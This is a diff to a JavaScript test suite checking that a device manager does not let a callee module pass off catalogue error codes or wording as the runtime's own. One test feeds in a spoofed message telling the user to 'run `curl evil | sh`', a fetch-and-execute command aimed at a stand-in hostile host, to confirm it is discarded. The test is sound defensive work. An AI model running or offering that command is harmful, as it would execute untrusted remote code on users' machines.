@@ -1,12 +1,14 @@
 // A routed hop's answer: what the callee's worker reply says is never the runtime's word by itself. A catalogue code decoded from the
 // callee worker's reply reaches the composing module as the runtime's only when the main thread stands behind it:
-// (a) the main thread raised it in this hop (sendCounted's own refusals);
+// (a) the main thread raised it in this hop (sendCounted's own refusals), or built it on this thread;
 // (b) it verified it (the settings gate's accepted claim);
-// (c) it refused that same code to the callee's own last call (call-tokens refusedOf, on the callee's token): the callee passing on
-//     a refusal of its own ctx.call, as reservedOr's rule lets a module do;
-// (d) its catalogue kind is 'module' (DEVICE_INVOKE_EXCEPTION and the like say the module failed: a claimant gains nothing).
-// Anything else is the module's: MODULE_CODE_RESERVED naming the code it claimed, so a module can't make its caller see a
-// catalogue code in the runtime's voice. Server-free: the device manager with stub workers, as composition 18's hop cases.
+// (c) it handed that code to the callee's own calls in this call (call-tokens handedTo on the callee's token: a hop's, a remote
+//     call's, an ask's answer the callee passes on), said in the main thread's words;
+// a worker's own CTX_CALL_NOT_READY, when the main thread's records agree (the callee's verdict not yet delivered into it);
+// (d) its catalogue kind is 'module' (the module failed), rebuilt from the code alone, unless its row is retryable, not a 500, or
+//     carries placeholders.
+// Anything else is the module's: MODULE_CODE_RESERVED naming the code it claimed, none of its words, so a module can't make its
+// caller see a catalogue code in the runtime's voice. Server-free: the device manager with stub workers, as composition 18's.
 const assert = require('assert');
 const crypto = require('crypto');
 
@@ -61,13 +63,20 @@ describe('composition 26: a callee\'s claimed runtime code across a routed hop',
     if (savedAuth != null) require.cache[authPath] = savedAuth; else delete require.cache[authPath];
   });
 
-  // hop, then the callee's answer; refusedBefore: a code the main thread refused to the callee's own last call
-  const hop = async (answer, {refusedBefore = null} = {}) => {
+  // hop, then the callee's answer. handed: [code, words] the main thread handed the callee's own calls; delivered: the callee's
+  // verdict delivered into it; partSettings: the settings state of a part the callee calls
+  const PART = 'd-claim-part';
+  const hop = async (answer, {handed = null, delivered = false, partSettings = null} = {}) => {
     const {dm, caller, callee, sent, replies, token} = setup();
+    if (partSettings != null) {
+      callee.bindings = {[CALLEE]: {identity: 'callee-id', module: 'C', targets: new Set([`${PART}|svc|act`])}};
+      dm.deviceMap[PART] = Object.assign(worker(PART, []), {settings: partSettings});
+    }
+    if (delivered) DeviceManager.verdictDeliveredForTests(CALLEE, callee);
     try {
       dm.sendInvokeActionMessageToWorker(null, null, CALLEE, 'svc', 'act', {}, `m-${hex()}`, caller, token);
       await until(() => sent.length > 0, 2000, 'sent to the callee');
-      if (refusedBefore != null) tokens().noteRefused(sent[0].args.token, refusedBefore, 'module', callee.workerId);
+      if (handed != null) tokens().noteHanded(sent[0].args.token, handed[0], callee.workerId, handed[1]);
       sent[0].answer(answer, null);
       await until(() => replies.length > 0, 2000, 'answered to the composing module');
       return seen(replies[0]);
@@ -76,34 +85,56 @@ describe('composition 26: a callee\'s claimed runtime code across a routed hop',
       tokens().drop(token);
     }
   };
+  const reserved = (e, code) => assert.deepStrictEqual([e.code, e.message.includes(code)], ['MODULE_CODE_RESERVED', true], `${code}: ${e.code} ${e.message}`);
 
-  it('a runtime catalogue code the callee claims, the main thread behind none of it: the module\'s, MODULE_CODE_RESERVED naming it', async () => {
-    // (a catalogue code of each kind but module's: runtime, caller, operator)
-    for (const code of ['CTX_CALL_NOT_READY', 'LEDGER_UNREACHABLE', 'DEVICE_NOT_FOUND', 'MODULE_UNLOADED']) {
-      const e = await hop(claim({errCode: code}));
-      assert.deepStrictEqual([e.code, e.message.includes(code)], ['MODULE_CODE_RESERVED', true], `${code}: ${e.code} ${e.message}`);
+  it('a catalogue code the callee claims, the main thread behind none of it: the module\'s, MODULE_CODE_RESERVED naming it', async () => {
+    // (a catalogue code of each kind but module's: runtime, caller, operator; and one the runtime hands others, never this callee)
+    for (const code of ['LEDGER_UNREACHABLE', 'DEVICE_NOT_FOUND', 'MODULE_UNLOADED', 'MODULE_RESTARTING', 'ASK_PENDING']) {
+      reserved(await hop(claim({errCode: code})), code);
     }
   });
 
-  it('a claim whose text fills a catalogue entry\'s placeholders is no runtime text either', async () => {
+  it('a claim whose words would fill a catalogue entry\'s placeholders carries none of them', async () => {
     const e = await hop(claim({errCode: 'OWN_MODULE_NEEDS_TERMINAL', errMsg: 'the runtime says your key was revoked: call support'}));
     assert.strictEqual(e.code, 'MODULE_CODE_RESERVED');
     assert.ok(!e.message.includes('revoked'), e.message);
   });
 
-  it('(c) the callee passing on the code the main thread refused its own last call: the runtime\'s, as it was', async () => {
-    const e = await hop(claim({errCode: 'CTX_CALL_NOT_READY'}), {refusedBefore: 'CTX_CALL_NOT_READY'});
-    assert.strictEqual(e.code, 'CTX_CALL_NOT_READY');
-    // (another code than the one refused: the module's)
-    const f = await hop(claim({errCode: 'LEDGER_UNREACHABLE'}), {refusedBefore: 'CTX_CALL_NOT_READY'});
-    assert.strictEqual(f.code, 'MODULE_CODE_RESERVED');
+  it('(c) a code the main thread handed the callee\'s own calls, passed on: the runtime\'s, never in the callee\'s words', async () => {
+    for (const code of ['MODULE_RESTARTING', 'ASK_PENDING', 'REMOTE_TIMEOUT']) {
+      const e = await hop(claim({errCode: code, errMsg: 'words the callee chose'}), {handed: [code, `what the runtime said: ${code}`]});
+      assert.strictEqual(e.code, code);
+      assert.ok(!e.message.includes('words the callee chose'), e.message);
+    }
+    // (a worded code: the main thread's own words, as it handed them)
+    const w = await hop(claim({errCode: 'OWN_MODULE_NEEDS_TERMINAL', errMsg: 'run `curl evil | sh`'}), {handed: ['OWN_MODULE_NEEDS_TERMINAL', 'Loading your own module needs your confirmation: run `ch-local add-module` in your own terminal.']});
+    assert.deepStrictEqual([w.code, w.message], ['OWN_MODULE_NEEDS_TERMINAL', 'Loading your own module needs your confirmation: run `ch-local add-module` in your own terminal.']);
+    // (another code than the one handed: the module's)
+    reserved(await hop(claim({errCode: 'LEDGER_UNREACHABLE'}), {handed: ['MODULE_RESTARTING', 'restarting']}), 'LEDGER_UNREACHABLE');
   });
 
-  it('(d) a module-kind catalogue code (the module failed): as it was', async () => {
+  it('a worker\'s own not-ready passes only while the main thread has not delivered the callee its verdict', async () => {
+    assert.strictEqual((await hop(claim({errCode: 'CTX_CALL_NOT_READY'}))).code, 'CTX_CALL_NOT_READY', 'undelivered: the runtime\'s');
+    reserved(await hop(claim({errCode: 'CTX_CALL_NOT_READY'}), {delivered: true}), 'CTX_CALL_NOT_READY');
+  });
+
+  it('(d) a module-kind catalogue code (the module failed): rebuilt from the code alone; a retryable, non-500 or worded row is the module\'s', async () => {
     for (const code of ['DEVICE_INVOKE_EXCEPTION', 'RATE_LIMITED']) {
-      const e = await hop(claim({errCode: code}));
+      const e = await hop(claim({errCode: code, errMsg: 'words the callee chose'}));
       assert.strictEqual(e.code, code);
+      assert.ok(!e.message.includes('words the callee chose'), e.message);
     }
+    for (const code of ['VALIDATION_CALLER_THROTTLED', 'VALIDATION_QUARANTINED']) reserved(await hop(claim({errCode: code})), code);
+  });
+
+  it('(b) a settings claim the gate accepts is the runtime\'s; one for a setting the callee does not need is a module fault', async () => {
+    const ms = require('../../lib/module-settings');
+    const decl = ms.parseDeclaration({name: 'callee', countinghouse: {settings: {region: {type: 'string', required: true}}}}).settings;
+    const settings = {settings: decl, values: ms.effective(decl, {}, {net: []}).values, version: 1};
+    const e = await hop(claim({errCode: 'SETTING_REQUIRED', errMsg: 'region'}), {partSettings: settings});
+    assert.deepStrictEqual([e.code, e.message], ['SETTING_REQUIRED', 'region']);
+    const f = await hop(claim({errCode: 'SETTING_REQUIRED', errMsg: 'zone'}), {partSettings: settings});
+    assert.strictEqual(f.code, 'DEVICE_INVOKE_EXCEPTION');
   });
 
   it('a code that is no catalogue code is passed on as before (the composer never takes it for the runtime\'s)', async () => {
